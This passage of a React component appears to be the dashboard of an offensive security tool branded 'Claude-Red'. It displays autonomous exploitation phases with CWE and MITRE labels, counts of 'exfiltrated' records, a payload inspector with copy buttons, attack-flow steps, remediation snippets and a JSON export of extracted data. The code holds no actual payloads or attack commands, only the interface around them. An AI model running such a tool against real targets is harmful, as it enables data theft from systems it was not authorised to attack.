                          <Icon size={16} />
                        </div>
                        <div className="flex-1 min-w-0">
                          <div className="flex items-center justify-between">
                            <span className="text-xs font-semibold text-white group-hover:text-pink-300 transition-colors">
                              {s.type}
                            </span>
                            <span className="text-xs font-mono font-bold text-red-400 bg-red-950/40 px-1.5 py-0.5 rounded border border-red-900/30">
                              {s.count}
                            </span>
                          </div>
                          
                          {/* Endpoint and method */}
                          <div className="flex items-center gap-1.5 mt-1 text-[11px] text-gray-400 font-mono truncate">
                            <span className="px-1 py-0.2 rounded bg-gray-800 text-[10px] text-blue-400 font-bold">
                              {s.method}
                            </span>
                            <span className="truncate">{s.endpoint}</span>
                          </div>

                          {/* Sample summary */}
                          {s.sample && (
                            <div className="text-xs text-gray-400 truncate mt-1 font-mono">
                              {s.sample}
                            </div>
                          )}

                          {/* Click to inspect */}
                          <div className="flex items-center gap-1 mt-1.5 text-[10px] text-pink-400/80 group-hover:text-pink-300 font-medium">
                            <Eye size={11} /> View payload, flow & fix <ArrowRight size={10} className="group-hover:translate-x-0.5 transition-transform" />
                          </div>
                        </div>
                      </div>
                    </div>
                  )
                })}
              </div>
            )}
          </div>

          {/* Attack Phases & Techniques Implemented */}
          <div className="qs-card">
            <div className="flex items-center justify-between mb-3">
              <h3 className="text-xs font-semibold text-gray-400 uppercase tracking-wider flex items-center gap-1.5">
                <Layers size={13} className="text-cyan-400" /> Attack Phases & Techniques
              </h3>
              <span className="text-[10px] text-gray-500 font-mono">Claude-Red / MITRE</span>
            </div>

            <div className="space-y-3">
              {PHASE_CONFIG.map(({ phase: p, label, claudeRedModule, techniques }) => {
                const currentIdx = PHASE_ORDER.indexOf(phase)
                const thisIdx = PHASE_ORDER.indexOf(p)
                const isDone = currentIdx > thisIdx
                const isActive = phase === p && running

                return (
                  <div
                    key={p}
                    className={`p-2.5 rounded-lg border transition-all duration-200 ${
                      isActive
                        ? 'bg-blue-950/20 border-blue-500/40 shadow-sm shadow-blue-500/10'
                        : isDone
                        ? 'bg-gray-900/40 border-gray-800/80'
                        : 'bg-gray-950/30 border-gray-900'
                    }`}
                  >
                    {/* Phase Header */}
                    <div className="flex items-center justify-between mb-1.5">
                      <div className="flex items-center gap-2">
                        {isDone ? (
                          <CheckCircle2 size={15} className="text-green-400 flex-shrink-0" />
                        ) : isActive ? (
                          <div className="w-3.5 h-3.5 rounded-full border-2 border-orange-400 border-t-transparent animate-spin flex-shrink-0" />
                        ) : (
                          <div className="w-3.5 h-3.5 rounded-full border border-gray-700 flex-shrink-0" />
                        )}
                        <div>
                          <span className={`text-xs font-semibold ${isDone ? 'text-green-400' : isActive ? PHASE_COLOR[p] : 'text-gray-400'}`}>
                            {label}
                          </span>
                          <span className="text-[9px] text-gray-600 block font-mono">{claudeRedModule}</span>
                        </div>
                      </div>
                      <span className="text-[10px] font-mono text-gray-500">
                        {isDone ? 'EXPLOITED' : isActive ? 'EXECUTING' : 'PENDING'}
                      </span>
                    </div>

                    {/* Implemented Techniques */}
                    <div className="ml-5 flex flex-wrap gap-1.5 mt-1">
                      {techniques.map(tech => (
                        <div
                          key={tech.name}
                          className={`inline-flex items-center gap-1 text-[10px] px-2 py-0.5 rounded-md border font-mono transition-colors ${
                            isActive
                              ? 'bg-orange-500/10 border-orange-500/30 text-orange-300'
                              : isDone
                              ? 'bg-green-500/10 border-green-500/20 text-green-300'
                              : 'bg-gray-800/60 border-gray-800 text-gray-500'
                          }`}
                          title={`${tech.cwe} (${tech.mitre}): ${tech.desc}`}
                        >
                          <span className="text-[9px] opacity-75 font-bold">[{tech.cwe}]</span>
                          <span>{tech.name}</span>
                        </div>
                      ))}
                    </div>
                  </div>
                )
              })}
            </div>
          </div>

        </div>
      </div>

      {/* Done Banner */}
      {done && (
        <div className="qs-card border-green-500/30 bg-green-500/5 flex flex-col md:flex-row md:items-center justify-between gap-3 py-4">
          <div className="flex items-center gap-3">
            <CheckCircle2 size={22} className="text-green-400 flex-shrink-0" />
            <div>
              <div className="font-semibold text-green-300 text-sm">Claude-Red Autonomous Exploitation Complete</div>
              <div className="text-xs text-gray-400 mt-0.5">
                Exfiltrated <strong>{totalExfiltratedCount} records</strong> across <strong>{stolen.length} offensive attack categories</strong>. Click any record card to inspect injected payloads, step-by-step security flows, and defensive remediation code.
              </div>
            </div>
          </div>
          <button
            onClick={() => stolen.length > 0 && setSelectedRecord(stolen[0])}
            className="qs-btn-secondary text-xs flex items-center gap-1.5 text-pink-300 border-pink-500/30 self-start md:self-auto"
          >
            <Eye size={14} /> Review All Findings
          </button>
        </div>
      )}

      {/* ─── MODAL / FULL DATA, SECURITY FLOW & HARDENING INSPECTOR ──────────── */}
      {selectedRecord && (
        <div className="fixed inset-0 z-50 flex items-center justify-center p-4 bg-black/80 backdrop-blur-sm animate-in fade-in duration-200">
          <div className="bg-[#0f1422] border border-gray-700 rounded-2xl w-full max-w-4xl max-h-[92vh] flex flex-col shadow-2xl overflow-hidden">
            
            {/* Modal Header */}
            <div className="flex items-center justify-between px-6 py-4 border-b border-gray-800 bg-gray-900/80">
              <div className="flex items-center gap-3">
                <div className={`w-9 h-9 rounded-xl flex items-center justify-center bg-black/60 ${selectedRecord.color}`}>
                  <selectedRecord.icon size={18} />
                </div>
                <div>
                  <h2 className="text-lg font-bold text-white flex items-center gap-2">
                    {selectedRecord.type}
                    <span className="text-xs font-mono px-2 py-0.5 rounded-full bg-pink-500/20 text-pink-300 border border-pink-500/30">
                      {selectedRecord.count} records exfiltrated
                    </span>
                  </h2>
                  <p className="text-xs text-gray-400 font-mono flex items-center gap-2">
                    <span>{selectedRecord.cwe}</span> · 
                    {selectedRecord.mitre && <span>MITRE {selectedRecord.mitre} · </span>}
                    <span>Captured at {selectedRecord.timestamp}</span>
                  </p>
                </div>
              </div>
              <button
                onClick={() => setSelectedRecord(null)}
                className="w-8 h-8 rounded-lg bg-gray-800 hover:bg-gray-700 text-gray-400 hover:text-white flex items-center justify-center transition-colors"
              >
                <XCircle size={18} />
              </button>
            </div>

            {/* Modal Body */}
            <div className="flex-1 overflow-y-auto p-6 space-y-6">
              
              {/* 1. Target URL & Technique Bar */}
              <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
                <div className="bg-gray-900/80 p-3.5 rounded-xl border border-gray-800 space-y-1">
                  <div className="text-[11px] font-mono text-gray-400 uppercase tracking-wider">Target Endpoint & Method</div>
                  <div className="flex items-center justify-between gap-2 mt-1">
                    <div className="flex items-center gap-2 font-mono text-xs text-white truncate">
                      <span className="px-2 py-0.5 rounded bg-blue-500/20 text-blue-400 font-bold border border-blue-500/30">
                        {selectedRecord.method}
                      </span>
                      <span className="truncate text-cyan-300">{selectedRecord.endpoint}</span>
                    </div>
                    <button
                      onClick={() => copyToClipboard(selectedRecord.endpoint, 'endpoint')}
                      className="text-gray-400 hover:text-white p-1 rounded hover:bg-gray-800"
                      title="Copy URL"
                    >
                      {copiedKey === 'endpoint' ? <Check size={14} className="text-green-400" /> : <Copy size={14} />}
                    </button>
                  </div>
                </div>

                <div className="bg-gray-900/80 p-3.5 rounded-xl border border-gray-800 space-y-1">
                  <div className="text-[11px] font-mono text-gray-400 uppercase tracking-wider">Claude-Red Attack Skill & Technique</div>
                  <div className="text-xs font-semibold text-pink-300 mt-1">
                    {selectedRecord.technique}
                  </div>
                  <div className="text-[11px] text-gray-400 font-mono">
                    {selectedRecord.claudeRedSkill || selectedRecord.cwe}
                  </div>
                </div>
              </div>

              {/* 2. Exposed Info Breakdown */}
              <div className="space-y-3">
                <div className="flex items-center gap-2">
                  <ShieldAlert size={16} className="text-red-400" />
                  <h3 className="text-sm font-semibold text-white">Exposed Information Breakdown</h3>
                </div>

                <div className="p-3.5 rounded-xl bg-red-950/20 border border-red-500/30 space-y-2">
                  <ul className="space-y-1.5 text-xs text-red-200">
                    {selectedRecord.exposedInfoSummary.map((info, idx) => (
                      <li key={idx} className="flex items-start gap-2">
                        <span className="text-red-400 font-bold">•</span>
                        <span>{info}</span>
                      </li>
                    ))}
                  </ul>
                </div>
              </div>

              {/* 3. Security Hardening & Remediation */}
              <div className="space-y-3">
                <div className="flex items-center gap-2">
                  <ShieldCheck size={16} className="text-green-400" />
                  <h3 className="text-sm font-semibold text-white">Defensive Hardening & Remediation</h3>
                </div>

                <div className="space-y-3">
                  {selectedRecord.remediationTechniques.map((rem, idx) => (
                    <div key={idx} className="p-3.5 rounded-xl bg-green-950/20 border border-green-500/30 space-y-2">
                      <div className="flex items-center justify-between">
                        <span className="text-xs font-bold text-green-300">{rem.title}</span>
                        <span className="text-[10px] font-mono px-2 py-0.5 rounded bg-green-900/40 text-green-300 border border-green-800">
                          {rem.technique}
                        </span>
                      </div>
                      <p className="text-xs text-gray-300 leading-relaxed">{rem.recommendation}</p>
                      {rem.codeSnippet && (
                        <pre className="p-2.5 bg-[#080b11] border border-gray-800 rounded-lg font-mono text-[11px] text-cyan-300 overflow-x-auto whitespace-pre-wrap mt-2">
                          {rem.codeSnippet}
                        </pre>
                      )}
                    </div>
                  ))}
                </div>
              </div>

              {/* 4. Step-by-Step Security Execution Flow */}
              <div className="space-y-3">
                <div className="flex items-center gap-2">
                  <Layers size={16} className="text-yellow-400" />
                  <h3 className="text-sm font-semibold text-white">Security Attack Flow & Exploitation Sequence</h3>
                </div>

                <div className="space-y-2.5">
                  {selectedRecord.securityFlow.map(f => (
                    <div key={f.step} className="flex items-start gap-3 p-3 rounded-xl bg-gray-900/50 border border-gray-800/80">
                      <div className="w-6 h-6 rounded-full bg-red-500/20 border border-red-500/40 text-red-400 font-bold font-mono text-xs flex items-center justify-center flex-shrink-0 mt-0.5">
                        {f.step}
                      </div>
                      <div className="flex-1 min-w-0">
                        <div className="flex items-center justify-between">
                          <span className="text-xs font-bold text-white">{f.title}</span>
                          <span className="text-[10px] font-mono px-2 py-0.5 rounded bg-gray-800 text-gray-400 border border-gray-700">
                            {f.technique}
                          </span>
                        </div>
                        <p className="text-xs text-gray-400 mt-1 leading-relaxed">{f.description}</p>
                      </div>
                    </div>
                  ))}
                </div>
              </div>

              {/* 5. Injected Exploit Payload */}
              {selectedRecord.payload && (
                <div className="space-y-2">
                  <div className="flex items-center justify-between">
                    <div className="flex items-center gap-2">
                      <Code size={15} className="text-cyan-400" />
                      <h3 className="text-sm font-semibold text-white">Injected Exploit Payload / Request Body</h3>
                    </div>
                    <button
                      onClick={() => copyToClipboard(selectedRecord.payload!, 'payload')}
                      className="text-xs font-mono text-gray-400 hover:text-white flex items-center gap-1"
                    >
                      {copiedKey === 'payload' ? <Check size={13} className="text-green-400" /> : <Copy size={13} />}
                      <span>{copiedKey === 'payload' ? 'Copied' : 'Copy Payload'}</span>
                    </button>
                  </div>
                  <pre className="p-3 bg-[#080b11] border border-gray-800 rounded-xl font-mono text-xs text-cyan-300 overflow-x-auto whitespace-pre-wrap">
                    {selectedRecord.payload}
                  </pre>
                </div>
              )}

              {/* 6. Complete Extracted Data (JSON Inspector) */}
              <div className="space-y-3">
                <div className="flex items-center justify-between">
                  <div className="flex items-center gap-2">
                    <Database size={16} className="text-green-400" />
                    <h3 className="text-sm font-semibold text-white">Complete Extracted Data ({selectedRecord.records.length} items)</h3>
                  </div>
                  <div className="flex items-center gap-2">
                    <button
                      onClick={() => copyToClipboard(JSON.stringify(selectedRecord.records, null, 2), 'rawdata')}
                      className="qs-btn-secondary text-xs flex items-center gap-1.5"
                    >
                      {copiedKey === 'rawdata' ? <Check size={13} className="text-green-400" /> : <Copy size={13} />}
                      <span>{copiedKey === 'rawdata' ? 'Copied' : 'Copy JSON'}</span>
                    </button>
                    <button
                      onClick={() => {
                        const blob = new Blob([JSON.stringify(selectedRecord.records, null, 2)], { type: 'application/json' })
                        const url = URL.createObjectURL(blob)
                        const a = document.createElement('a')
                        a.href = url
                        a.download = `exfiltrated-${selectedRecord.id}-${Date.now()}.json`
                        a.click()
                      }}
                      className="qs-btn-secondary text-xs flex items-center gap-1.5 text-cyan-300"
                    >
                      <FileDown size={13} /> Export JSON
                    </button>
                  </div>
                </div>

                <div className="bg-[#080b11] border border-gray-800 rounded-xl p-4 overflow-hidden">
                  <pre className="font-mono text-xs text-green-400 max-h-80 overflow-y-auto leading-relaxed">
                    {JSON.stringify(selectedRecord.records, null, 2)}
                  </pre>
                </div>
              </div>

            </div>

            {/* Modal Footer */}
            <div className="px-6 py-3 border-t border-gray-800 bg-gray-900/60 flex items-center justify-between text-xs text-gray-500 font-mono">
              <span>Target: {targetUrl}</span>
              <button
                onClick={() => setSelectedRecord(null)}
                className="qs-btn-secondary text-xs"
              >
                Close Inspector
              </button>
            </div>

          </div>
        </div>
      )}

    </div>
  )
}
